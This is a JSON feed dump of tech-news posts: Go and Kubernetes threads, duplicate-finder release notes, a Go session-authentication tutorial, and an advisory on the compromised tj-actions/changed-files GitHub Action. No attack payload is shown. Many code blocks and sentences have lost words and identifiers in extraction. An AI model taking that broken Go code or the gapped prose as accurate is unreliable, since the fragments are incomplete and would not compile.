Flickr. So in the end all that effort paid off.</p><p>Fedit (and Fiew) source code is available on <a href=\"https://github.com/f055/fedit-image-editor\" target=\"_blank\" rel=\"noopener\">GitHub</a>. The thesis documentation is available as <a href=\"https://f055.net/wp-content/uploads/files/Thesis-Fedit.pdf\">PDF</a>. The original website for these apps is still up on the <a href=\"https://web.archive.org/web/20140517125711/http://fapplication.org/\" target=\"_blank\" rel=\"noopener\">Web Archive</a>!</p>","contentLength":3735,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcq61a/dev_recreates_photoshop_in_c/"},{"title":"tk9.0: v0.65.0 adds support for many more image formats","url":"https://www.reddit.com/r/golang/comments/1jcpp3d/tk90_v0650_adds_support_for_many_more_image/","date":1742143528,"author":"/u/0xjnml","guid":723,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/0xjnml\"> /u/0xjnml </a>","contentLength":29,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"MCP-server written in GO","url":"https://www.reddit.com/r/golang/comments/1jcp06c/mcpserver_written_in_go/","date":1742141699,"author":"/u/Temporary-Funny-1630","guid":760,"unread":true,"content":"<p>Hey everyone! I’d love to share my project with you:</p><p>🚀  – a powerful  for AI agents!</p><p>-  for AI agent interactions - <strong>Supports multiple databases</strong>: PostgreSQL, MySQL, ClickHouse, Oracle, and more - <strong>Flexible modular architecture</strong> with plugins:</p><ul></ul><p>⭐ <strong>Give it a star and come contribute!</strong> 🔗 Repo: <a href=\"https://github.com/centralmind/gateway\">GitHub</a></p>","contentLength":300,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go is DOOMed","url":"https://gitlab.com/cznic/doomgeneric/-/raw/master/sshot.png","date":1742139955,"author":"/u/0xjnml","guid":569,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jcochm/go_is_doomed/"},{"title":"How the hell do I make this Go program faster?","url":"https://www.reddit.com/r/golang/comments/1jcnqfi/how_the_hell_do_i_make_this_go_program_faster/","date":1742138311,"author":"/u/yourpwnguy","guid":568,"unread":true,"content":"<p>So, I’ve been messing around with a Go program that: </p><ul><li>Writes the sorted output to a new file</li></ul><p>Seems so straightforward man :( Except it’s slow as hell. Here’s my code: </p><p>import ( \"fmt\" \"os\" \"strings\" \"slices\" )</p><p>func main() { if len(os.Args) &lt; 2 { fmt.Fprintln(os.Stderr, \"Usage:\", os.Args[0], \"&lt;file.txt&gt;\") return }</p><pre><code>// Read the input file f, err := os.ReadFile(os.Args[1]) if err != nil { fmt.Fprintln(os.Stderr, \"Error reading file:\", err) return } // Process the file lines := strings.Split(string(f), \"\\n\") uniqueMap := make(map[string]bool, len(lines)) </code></pre><p>var trimmed string for _, line := range lines { if trimmed = strings.TrimSpace(line); trimmed != \"\" { uniqueMap[trimmed] = true } }</p><pre><code>// Convert map keys to slice ss := make([]string, len(uniqueMap)) i := 0 for key := range uniqueMap { ss[i] = key i++ } slices.Sort(ss) // Write to output file o, err := os.Create(\"out.txt\") if err != nil { fmt.Fprintln(os.Stderr, \"Error creating file:\", err) return } defer o.Close() o.WriteString(strings.Join(ss, \"\\n\") + \"\\n\") </code></pre><p>I ran this on a big file, here's the link:</p><p>It takes  to run. That’s unacceptable. My CPU (R5 4600H 6C/12T, 24GB RAM) should not be struggling this hard.</p><p>I also profiled this code, Profiling Says: 1. Sorting (slices.Sort) is eating CPU. 2. GC is doing a world tour on my RAM. 3. map[string]bool is decent but might not be the best for this. I also tried the map[string] struct{} way but it's makes really minor difference.</p><p>The Goal: I want this thing to finish in 2-3 seconds. Maybe I’m dreaming, but whatever.</p><p>Any insights, alternative approaches, or even just small optimizations would be really helpful. Please if possible give the code too. Because I've literally tried so many variations but it still doesn't work like I want it to be. I also want to get better at writing efficient code, and squeeze out performance where possible.</p>","contentLength":1853,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"GitOps Principles - Separate Repositories for App & Kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1jcn002/gitops_principles_separate_repositories_for_app/","date":1742136264,"author":"/u/k8s_maestro","guid":369,"unread":true,"content":"<p>For a production-grade environment, the best practice is to keep the application source code and infra in separate Git repositories. </p><p>Is it true GirOps Principle? As it ensures clear separation of concerns, security and operational stability.</p>","contentLength":241,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"xlskubectl — a spreadsheet to control your Kubernetes cluster","url":"https://github.com/learnk8s/xlskubectl","date":1742136231,"author":"/u/ponton","guid":368,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1jcmzkc/xlskubectl_a_spreadsheet_to_control_your/"},{"title":"OpenSource Book: Embedded programming with ESP32 (For esp-hal 1.0.0-beta)","url":"https://www.reddit.com/r/rust/comments/1jcmj3g/opensource_book_embedded_programming_with_esp32/","date":1742134952,"author":"/u/AstraKernel","guid":722,"unread":true,"content":"<div><p>The book \"impl Rust for ESP32\" has been migrated to use the latest esp-hal 1.0.0-beta; The book uses development board \"ESP32 DevKit V1 and follows practical exercises approach. Added more chapters also.</p><ul><li>Blink LED, Fading LED with PWM</li><li>Displaying Text and Ferris image on OLED display</li><li>Buzzer to make beep sound and play Pink Panther song (repo for other songs)</li><li>Using Ultrasonic to measure object distance</li><li>Control Servo motor with LEDC as well as MCPWM peripherals</li><li>Turning on LED when room gets darker with LDR</li><li>Connect to existing Wi-Fi or Create own Wi-Fi</li><li>Run web server to turn on LED on ESP32</li><li>Create Burglar alarm simulation with PIR Sensor</li><li>Displaying temperature on OLED</li><li>Reading and Writing SD Card</li><li>Working with RFID and Door Access Control simulation</li><li>Send and Receive from mobile to ESP32 via Bluetooth</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/AstraKernel\"> /u/AstraKernel </a>","contentLength":826,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"SuperMuxer: tiny and compact, dependency-free package to configure your HTTP routes","url":"https://www.reddit.com/r/golang/comments/1jcmfrb/supermuxer_tiny_and_compact_dependencyfree/","date":1742134690,"author":"/u/FlairPrime","guid":361,"unread":true,"content":"<p>Super  Go package to configure your HTTP routes using only the . Define routes, middlewares, groups, and subgroups effortlessly!</p><p>This package acts like a : It is  and , providing everything you need in just  file with <strong>less than 200 lines of code</strong>.</p><ul><li>You want to  define your HTTP routes while using  the standard library.</li><li>You want to define  for your routes, groups, and subgroups while still relying on the standard library.</li><li>You  want to use  bloated with excessive functionalities that you might never use.</li></ul>","contentLength":501,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Building a UI for Kubernetes, Helpful or Useless?","url":"https://www.reddit.com/r/kubernetes/comments/1jckjsm/building_a_ui_for_kubernetes_helpful_or_useless/","date":1742128776,"author":"/u/Pavel-Lukasenko","guid":371,"unread":true,"content":"<p>Hey everyone. I'm have been using Kubernetes for the last two years now and somehow got tired of typing kubectl and other stuff via command line.</p><p>I have built a native app that runs on my MacBook and helps me speed up cluster deployment, app publishing and debugging with the help of the UI.</p><p>I don't know if that might be useful for anyone but I am really open to any feedback.</p><p>Would you like trying it?</p>","contentLength":400,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Big LLMs weights are a piece of history","url":"https://antirez.com/news/147","date":1742127204,"author":"freeatnet","guid":151,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43378401"},{"title":"SteamOS 3.7.0 Preview Released (with KDE Plasma 6 & beginnings of support for non-Steam Deck handhelds)","url":"https://steamcommunity.com/games/1675200/announcements/detail/529841158837240757","date":1742127048,"author":"/u/pihug12","guid":382,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jck2mn/steamos_370_preview_released_with_kde_plasma_6/"},{"title":"Docs – Open source alternative to Notion or Outline","url":"https://github.com/suitenumerique/docs","date":1742125132,"author":"maelito","guid":150,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43378239"},{"title":"Git 2.49 Released With Faster Packing, Rust Foreign Language Interface","url":"https://www.phoronix.com/news/Git-2.49-Released","date":1742121486,"author":"/u/corvus_192","guid":374,"unread":true,"content":"\nGit 2.49 is out today as the latest feature update for this widely-used distributed version control system.\n<p>Git 2.49 delivers faster packing via name-hash v2, a new \"git backfill\" tool to address any missing historical blobs, \"git clone\" learned to make a shallow clone for a single commit that is not necessarily at the tip of any branch, lazy-loading missing files in a blobless clone, zlib-ng support preparations, and a foreign language interface for Rust has been added to the codebase.\n</p><p>This first bit of Rust code within Git introduces two new Rust crates: libgit-sys and libgit. Further work on Rust code within Git is being carried out for future Git releases.\n</p>Download and more details on the Git 2.49 release via the <a href=\"https://lore.kernel.org/lkml/xmqqfrjfilc8.fsf@gitster.g/\">release announcement</a>. Over on the <a href=\"https://github.blog/open-source/git/highlights-from-git-2-49/\">GitHub blog</a> are also more details on the Git 2.49 changes.","contentLength":820,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1jcipav/git_249_released_with_faster_packing_rust_foreign/"},{"title":"Introducing Eventure: A Powerful Event-Driven Framework for Python","url":"https://github.com/enricostara/eventure","date":1742117051,"author":"/u/jumpixel","guid":566,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jchp7w/introducing_eventure_a_powerful_eventdriven/"},{"title":"Czkawka/Krokiet 9.0 — Find duplicates faster than ever before","url":"https://www.reddit.com/r/linux/comments/1jchp31/czkawkakrokiet_90_find_duplicates_faster_than/","date":1742117035,"author":"/u/krutkrutrar","guid":719,"unread":true,"content":"<p>Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0 </p><p>The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.</p><p>With each new release, it seems that I am slowly reaching the limits — of my patience, Rust’s performance, and the possibilities for further optimization.</p><p>Czkawka is now at a stage where, at first glance, it’s hard to see what exactly can still be optimized, though, of course, it’s not impossible.</p><ul><li>Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.</li></ul><ul><li>Automatically rotating all images based on their EXIF orientation</li><li>Fixed a crash caused by negative time values on some operating systems</li><li>Updated `vid_dup_finder`; it can now detect similar videos shorter than 30 seconds</li><li>Added support for more JXL image formats (using a built-in JXL → image-rs converter)</li><li>Improved duplicate file detection by using a larger, reusable buffer for file reading</li><li>Added an option for significantly faster image resizing to speed up image hashing</li><li>Logs now include information about the operating system and compiled app features(only x86_64 versions)</li><li>Added size progress tracking in certain modes</li><li>Ability to stop hash calculations for large files mid-process</li><li>Implemented multithreading to speed up filtering of hard links</li><li>Reduced prehash read file size to a maximum of 4 KB</li><li>Fixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU cores</li><li>Improved scan cancellation speed when collecting files to check</li><li>Added support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variables</li><li>Fixed a crash in debug mode when checking broken files named `.mp3`</li><li>Catching panics from symphonia crashes in broken files mode</li><li>Printing a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)</li></ul><ul><li>Changed the default tab to “Duplicate Files”</li></ul><ul><li>Added a window icon in Wayland</li><li>Disabled the broken sort button</li></ul><ul><li>Added `-N` and `-M` flags to suppress printing results/warnings to the console</li><li>Fixed an issue where messages were not cleared at the end of a scan</li><li>Ability to disable cache via `-H` flag(useful for benchmarking)</li></ul><ul><li>This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runners</li><li>Linux and Mac binaries now are provided with two options x86_64 and arm64</li><li>Arm linux builds needs at least Ubuntu 24.04</li><li>Gtk 4.12 is used to build windows gtk gui instead gtk 4.10</li><li>Dropping support for snap builds — too much time-consuming to maintain and testing(also it is broken currently)</li><li>Removed native windows build krokiet version — now it is available only cross-compiled version from linux(should not be any difference)</li></ul><p>In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.</p><p>Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTK’s TreeView.</p><p>Price — free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL</p>","contentLength":3559,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Czkawka/Krokiet 9.0 — Find duplicates faster than ever before","url":"https://www.reddit.com/r/rust/comments/1jchjc4/czkawkakrokiet_90_find_duplicates_faster_than/","date":1742116298,"author":"/u/krutkrutrar","guid":373,"unread":true,"content":"<p>Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0</p><p>The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.</p><p>With each new release, it seems that I am slowly reaching the limits — of my patience, Rust’s performance, and the possibilities for further optimization.</p><p>Czkawka is now at a stage where, at first glance, it’s hard to see what exactly can still be optimized, though, of course, it’s not impossible.</p><ul><li>Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.</li></ul><ul><li>Automatically rotating all images based on their EXIF orientation</li><li>Fixed a crash caused by negative time values on some operating systems</li><li>Updated `vid_dup_finder`; it can now detect similar videos shorter than 30 seconds</li><li>Added support for more JXL image formats (using a built-in JXL → image-rs converter)</li><li>Improved duplicate file detection by using a larger, reusable buffer for file reading</li><li>Added an option for significantly faster image resizing to speed up image hashing</li><li>Logs now include information about the operating system and compiled app features(only x86_64 versions)</li><li>Added size progress tracking in certain modes</li><li>Ability to stop hash calculations for large files mid-process</li><li>Implemented multithreading to speed up filtering of hard links</li><li>Reduced prehash read file size to a maximum of 4 KB</li><li>Fixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU cores</li><li>Improved scan cancellation speed when collecting files to check</li><li>Added support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variables</li><li>Fixed a crash in debug mode when checking broken files named `.mp3`</li><li>Catching panics from symphonia crashes in broken files mode</li><li>Printing a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)</li></ul><ul><li>Changed the default tab to “Duplicate Files”</li></ul><ul><li>Added a window icon in Wayland</li><li>Disabled the broken sort button</li></ul><ul><li>Added `-N` and `-M` flags to suppress printing results/warnings to the console</li><li>Fixed an issue where messages were not cleared at the end of a scan</li><li>Ability to disable cache via `-H` flag(useful for benchmarking)</li></ul><ul><li>This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runners</li><li>Linux and Mac binaries now are provided with two options x86_64 and arm64</li><li>Arm linux builds needs at least Ubuntu 24.04</li><li>Gtk 4.12 is used to build windows gtk gui instead gtk 4.10</li><li>Dropping support for snap builds — too much time-consuming to maintain and testing(also it is broken currently)</li><li>Removed native windows build krokiet version — now it is available only cross-compiled version from linux(should not be any difference)</li></ul><p>In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.</p><p>Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTK’s TreeView.</p><p>Price — free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL</p>","contentLength":3558,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Show HN: My high school team’s space probe","url":"https://drive.google.com/file/d/1_9V6lBTIfDsPdKCohQBc5Ed5UzDbnsrI/view?usp=sharing","date":1742114889,"author":"JohnOfOsgiliath","guid":136,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43377690"},{"title":"Session-Based Authentication in Go","url":"https://themsaid.com/session-authentication-go","date":1742114173,"author":"/u/themsaid","guid":724,"unread":true,"content":"<p>Earlier, we explored <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">session management in Go web applications</a>, followed by a deep dive into <a href=\"https://themsaid.com/csrf-protection-go-web-applications\" rel=\"nofollow\">CSRF protection</a>. Drawing from my decade of experience building web applications with Laravel, I've found that good old session-based authentication remains the most convenient and secure way to authenticate users. It strikes the perfect balance between simplicity and security, making it an approach I trust for building reliable web apps.</p><p>The idea behind session-based authentication is simple:</p><div><pre>Client                                    Server\n  |                                          |\n  |   User visits the web app              |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server creates a session  sends   |\n  |     its  back                          |\n  | &lt;--------------------------------------- |\n  |                                          |\n  |   User submits login form              |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server verifies credentials and      |\n  |     stores the user identifier in the    |\n  |     session                              |\n  |                                          |\n  |   Server sends a success response      |\n  | &lt;----------------------------------------|\n  |                                          |\n  |   Client makes authenticated requests  |\n  |     (Cookie is automatically sent)       |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server retrieves session data     |\n  |     extracts the user identifier         |\n  |                                          |\n  |   Server processes request          |\n  |     responds                             |\n  | &lt;----------------------------------------|</pre></div><p>When a session is first created, before the visitor submits the login form, it is known as an . At this stage, the session is not yet linked to a specific user, but it can still store temporary data that enhances the user experience.</p><p>For example, in an e-commerce application, an unauthenticated session can store items added to a shopping cart before the user logs in. In a blog or forum, an unauthenticated session might be used to save a visitor’s draft comments before they sign up. In general, unauthenticated sessions can be used to store flash messages, such as \"Item added to cart\" or \"Invalid login credentials\".</p><p>Once the login form is submitted and the user's identity is verified, storing the user identifier in the session converts it into an . Each time the client sends the cookie containing the session ID, the server uses it to identify the associated user and tailor the response accordingly.</p><p>The first step in implementing an authentication mechanism in our web application is to enable user registration. During this process, a user typically provides an email or username along with a password. The server then performs input sanitization and various validation checks to ensure the credentials are secure, properly formatted, and unique.</p><p>Once these checks are passed, the server securely stores the user’s credentials, often hashing the password using a strong algorithm like  or  before saving it to the database.</p><p>Since the scope of this articles covers only the authentication part, we'll skip input validation and sanitization and focus on hashing the password and storing it in a database:</p><div><pre> (\n\t\n)\n\n(\n    sql., \n    , \n    ,\n)  {\n\t, .(\n\t\t[](),\n\t\t.,\n\t)\n\t {\n\t\t\n\t}\n\n\t\n}</pre></div><p>The first step in our  method is to generate a secure hash for the provided password using the  package. This is a crucial security measure that helps protect user credentials in case the database is ever compromised. Hashing passwords ensures that even if an attacker, or a rogue employee, gains access to the database, they cannot easily retrieve the original password.</p><p>The  algorithm includes a cost factor, which controls how computationally expensive it is to hash a password and verify it later. A higher cost factor increases security by making brute-force attacks more difficult, but it also slows down the hashing process.</p><p>In our example, we use the default cost of 10, which strikes a good balance between security and performance. Popular frameworks, such as Laravel, set the default cost to 12 for added protection.</p><p>Next, we'll store the  along with the  in the database:</p><div><pre>,  bcrypt.()\n\n\n\n_, .(\n    ,\n    ,\n    ,\n)\n {\n    \n}</pre></div><p>With this in place, we now have a record in the database that allows us to verify user credentials when they attempt to log in.</p><p>For session-based authentication, the login process consists of two key steps:</p><ol><li>Verify that the user exists and the provided password matches the stored hash.</li><li>Store the authenticated user's information in the session to maintain their logged-in state.</li></ol><p>In the first step, we retrieve the user record from the database using the provided username and compare the given password with its hashed version. We do that in a  function:</p><div><pre>(\n\tsql.,\n\t,\n\t,\n)  {\n\t.(\n\t\t,\n\t\t,\n\t).()\n\t {\n\t\t.(, )\n\t}\n\n\t.(\n\t\t[](),\n\t\t[](),\n\t)\n\t {\n\t\t.(, )\n\t}\n\n    \n}</pre></div><p>The <code>bcrypt.CompareHashAndPassword</code> function allows us to verify whether a given plain-text password () matches a bcrypt-hashed password (). Since the bcrypt algorithm generates a unique salt for each hash, hashing the same password multiple times will always produce different results. This means we cannot simply hash the plain password and compare it directly to the stored hash in a database query. Instead,  extracts the salt from the stored hash and uses it to perform the comparison securely.</p><p>Next, for storing the user in the session, we will add a  function:</p><div><pre>(\n\thttp.,\n\t,\n\t,\n)  {\n\t()\n\n\t.()\n\t {\n\t\t.(, )\n\t}\n\n\t.(, )\n\n\t\n}</pre></div><p>The  function takes in the request, the session manager, and the username. It retrieves the session from the request using the  function (which we covered in a <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">previous article</a>), then migrates the session by deleting the existing session from the session store, assigning a new session ID, and generating a fresh CSRF token. Finally, it stores the username in the session to maintain the user's authenticated state.</p><p>Generating a new session ID when a user's privilege level changes is crucial for protecting against session fixation attacks. Without this step, an attacker could inject a known session ID into the user's session cookie before they authenticate, and then reuse this session ID after the user logs in. This would grant the attacker unauthorized access to the user's account.</p><p>The  method looks like this:</p><div><pre> () ()  {\n\t..(.)\n\t {\n\t\t\n\t}\n\n\t.()\n\t.(, ())\n\n\t\n}</pre></div><p>As you can see, the old session is deleted while the in-memory session instance gets a new session ID and .</p><p>Before sending the response, the session manager's middleware will include the new session ID in the response, and store the session as a new entry in our session store. For a deeper dive into how this works, refer to the <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">earlier article</a>.</p><p>To log a user out, we must migrate the session and remove the  from the session data:</p><div><pre>(\n\thttp.,\n\t,\n)  {\n\t()\n\n\t.()\n\t {\n\t\t.(, )\n\t}\n\n\t.(, )\n\n\t\n}</pre></div><p>By migrating the session, we ensure that the existing authenticated session is removed from the session store and a new one is created with the same session data. In the  function, we remove the  from the session to effectively convert it into an unauthenticated session. If any other critical information is stored in the session, it should also be removed. However, keeping non-critical session data, such as user preferences or timezone settings, can help provide a smooth user experience.</p><div><h2>Authentication Middleware</h2><a aria-label=\"Permalink: Authentication Middleware\" href=\"https://themsaid.com/session-authentication-go#authentication-middleware\"></a></div><p>Now, we’ll add middleware to protect handlers from unauthenticated access. Within the middleware, we’ll query the database to verify that the username stored in the session exists, ensuring the session belongs to a valid user:</p><div><pre>(sql.,  http.) http. {\n\t.(( http., http.) {\n\t\t()\n\n\t\t.().()\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\n\t\t.(\n\t\t\t,\n\t\t\t,\n\t\t).()\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\t})\n}</pre></div><p>As you might have guessed, this middleware must run <strong>after the session has been added to the request</strong>. In other words, the session manager's middleware must execute before the authentication middleware. Otherwise, the authentication middleware will panic when calling the  function, as it expects the session to be present in the request context.</p><div><pre>(http.)  {\n\t, .().({}).()\n\t {\n\t\t()\n\t}\n\n\t\n}</pre></div><p>In our middleware, we respond with a  error if authentication fails. Alternatively, you could choose to redirect the user to a  page, allowing them to enter their credentials and start a new authenticated session.</p><div><h2>Preventing Timing Attacks</h2><a aria-label=\"Permalink: Preventing Timing Attacks\" href=\"https://themsaid.com/session-authentication-go#preventing-timing-attacks\"></a></div><p>When handling login requests, it's best practice to ensure the authentication process takes a constant amount of time, regardless of whether the credentials are correct or not. This helps prevent timing attacks, which is a type of attacks where an attacker measures the time it takes for the server to respond and uses that information to infer sensitive data, such as valid usernames or partial password matches.</p><p>To protect against timing attacks, we'll start a timer at the beginning of our handler and invoke a  call to ensure the handler responds exactly after a certain duration:</p><div><pre>.(, ( http., http.) {\n    ..()\n\n    .(\n        ,\n        .(),\n        .(),\n    )\n     {\n        .(, , .())\n    }\n\n    .().()  {\n        .(.().())\n    }\n\n     {\n        .(, , .)\n        \n    }\n\n    .(, , , .)\n})</pre></div><p>Here, we set the handler's duration to 1 second, but you can adjust this based on your application's performance needs and the desired user experience. Next, we call the  function to check if the provided credentials are valid. If they are, we proceed with the  function.</p><p>Before returning either a success or failure response, we measure the elapsed time and call  if it’s less than 1 second, ensuring a consistent response time to mitigate timing attacks.</p><p>By storing the authenticated user identifier in the session, we can easily differentiate between authenticated and non-authenticated sessions. This allows us to retrieve user information at any point during the request lifecycle, ensuring that we can verify and tailor responses based on the user's authentication status.</p><p>The process is simple: we begin by extracting the session from the request, and then check the username session attribute:</p><div><pre>()\n\n.().()\n {\n    \n}  {\n    \n}</pre></div><p>If the username exists, it indicates that the session is authenticated, and we can proceed to access relevant user data. If not, we know that the session is not authenticated, and we can prompt the user to log in.</p>","contentLength":10531,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jch2ts/sessionbased_authentication_in_go/"},{"title":"\"Gunyah Hypervisor Software - Supporting Protected VMs in Android Virtualization Framework\" by Elliot Berman and \"Co-written with Prakruthi Deepak Heragu\" (January 28, 2024)","url":"https://www.qualcomm.com/developer/blog/2024/01/gunyah-hypervisor-software-supporting-protected-vms-android-virtualization-framework","date":1742114152,"author":"/u/throwaway16830261","guid":565,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jch2nr/gunyah_hypervisor_software_supporting_protected/"},{"title":"Popular GitHub Action `tj-actions/changed-files` has been compromised with a payload that appears to attempt to dump secrets","url":"https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/","date":1742106264,"author":"/u/alexeyr","guid":409,"unread":true,"content":"<p>Popular GitHub Action <a rel=\"noopener noreferrer\" href=\"https://github.com/tj-actions/changed-files\">tj-actions/changed-files</a>&nbsp;has been compromised (<a rel=\"noopener noreferrer\" href=\"https://github.com/tj-actions/changed-files/issues/2463\">GitHub issue</a>) with a payload that appears to attempt to dump secrets, impacting thousands of CI pipelines.&nbsp;This isn’t the first security issue with tj-actions/changed-files—see prior vulnerability <a rel=\"noopener noreferrer\" href=\"https://www.cve.org/CVERecord?id=CVE-2023-51664\">CVE-2023-51664</a>.</p><ol start=\"2\"><li><p> Switch to a safer alternative or inline your file-change detection logic.</p><ol start=\"1\"><li><p>Just removing it from the main branch of your repository won’t be enough — it could still run on other branches depending on how your actions are configured. So you need to remove it from  branches to be safe.</p></li><li><ol start=\"1\"><li><p>You’ll need a list of GitHub Actions used at your org. Run this query on your codebase:</p><pre><code>$ semgrep -e 'uses: $ACTION' -l yaml --json .github  | jq -r '.results[].extra.metavars[\"$ACTION\"].abstract_content' | grep -vE '^(actions/|docker://|[.]/[.]github/|tj-actions/)' | awk -F'@' '{print $1 \"@*,\"}' | sort | uniq\nDataDog/synthetics-ci-github-action@*,\nactions-rs/toolchain@*,\nastral-sh/setup-uv@*,\naws-actions/amazon-ecr-login@*,</code></pre></li><li><p>Remove tj-actions/changed-files from the list of GitHub Actions.</p></li></ol></li><li><p><strong>Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe.</strong> In this case, it appears that all versions are compromised.</p></li><li><p><strong>Audit past workflow runs for signs of compromise.</strong> Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.</p></li></ol></li></ol>","contentLength":1435,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcfchv/popular_github_action_tjactionschangedfiles_has/"},{"title":"When a junior/entry SWE job lists Kubernetes & Docker what do they expect you to know?","url":"https://www.reddit.com/r/kubernetes/comments/1jceuxe/when_a_juniorentry_swe_job_lists_kubernetes/","date":1742104196,"author":"/u/Bobsthejob","guid":370,"unread":true,"content":"<p>If its not a DevOps job, but for example I have seen some backend dev jobs where as part of the requirements they list the usual CI/CD best practices, and Docker, and K8s ~ but what do they actually expect you to know in an interview for K8s? Thanks (edit explanation)</p>","contentLength":268,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Decoding JSON sum types in Go without panicking","url":"https://nicolashery.com/decoding-json-sum-types-in-go/","date":1742100126,"author":"/u/FoxInTheRedBox","guid":405,"unread":true,"content":"<p><em>The Go programming language doesn't have native support for sum types, but we'll see how we can emulate them, how to decode and encode them into JSON, and how in some cases they can help avoid runtime panic exceptions.</em></p><h2 tabindex=\"-1\">Whether we find them useful or not, sum types exist</h2><p>Many languages support sum types natively: <a href=\"https://zig.guide/language-basics/unions/\">Zig</a>, <a href=\"https://www.typescriptlang.org/docs/handbook/2/narrowing.html#discriminated-unions\">TypeScript</a>, <a href=\"https://ocaml.org/docs/basic-data-types#variants\">OCaml</a>, <a href=\"https://doc.rust-lang.org/book/ch06-00-enums.html\">Rust</a>, just to name a few. Even <a href=\"https://swagger.io/specification/#discriminator-object\">OpenAPI has them</a>, the de-facto standard and language-agnostic way to define HTTP APIs using JSON. So even if the programming language you're using doesn't natively support sum types, you may still need to handle a JSON payload over the wire that is modeled as one. This requires deciding how to decode that payload in your language of choice.</p><p>Personal feelings about sum types aside, I think most people would agree they effectively model data structures that can be <em>\"one of these (potentially very different) things, and nothing else\"</em>. And once you've experienced sum types with a  or match expression combined with , it's hard to go back.</p><p>Let's take a primitive type, a boolean or  in Rust. It has 2 possible values:  or  (also called \"cardinality\"). A struct or record is called a  because you can count the number of possible values (or cardinality) by  the number of possible values of each field. So if I have a struct with 2 boolean fields (example here in Rust):</p><pre><code>\n    signed_up\n    subscribed</code></pre><p>The number of possible values for this struct (or \"product type\") is: 2x2 = .</p><p>Now I didn't choose this struct example completely at random. Some of the possible values are not valid in this particular domain: a user can't be  if they are not  as well. You'll also hear the 